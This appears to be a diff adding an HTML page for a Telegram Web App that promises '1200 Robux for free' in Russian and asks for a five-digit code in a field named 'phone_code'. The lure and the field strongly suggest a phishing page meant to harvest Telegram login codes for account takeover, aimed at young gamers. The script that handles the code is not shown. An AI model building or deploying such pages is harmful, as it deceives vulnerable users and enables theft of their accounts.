@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <meta charset="utf-8" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;700&display=swap" rel="stylesheet">
+  
+  <link rel="stylesheet" href="style.css">
+  <title>TeleTemplate</title>
+ </head>
+
+ <body>
+    <div class="container">
+      <div>
+        <img  id="Logo" src="Logo.png"/>
+      </div>
+      <div class="texts">
+           Введите код, чтобы забрать <br>
+           <span id="Prem">1200 Robux</span> <span id="free">Бесплатно!</span>
+      </div>
+    <div class="container"> 
+<input type="text" class="message" id = 'phone_code' placeholder="Код:" maxlength="5" onkeyup="CheckIf();"  onkeypress='return event.charCode >= 48 && event.charCode <= 57'/>
+<button type="submit" id="send-button" disabled>
+ЗАБРАТЬ
+</button>
+</div> 
+    </div>  
+ </body>
+ <script src="https://telegram.org/js/telegram-web-app.js"></script>
+ <script src="js.js"></script>
+</html>
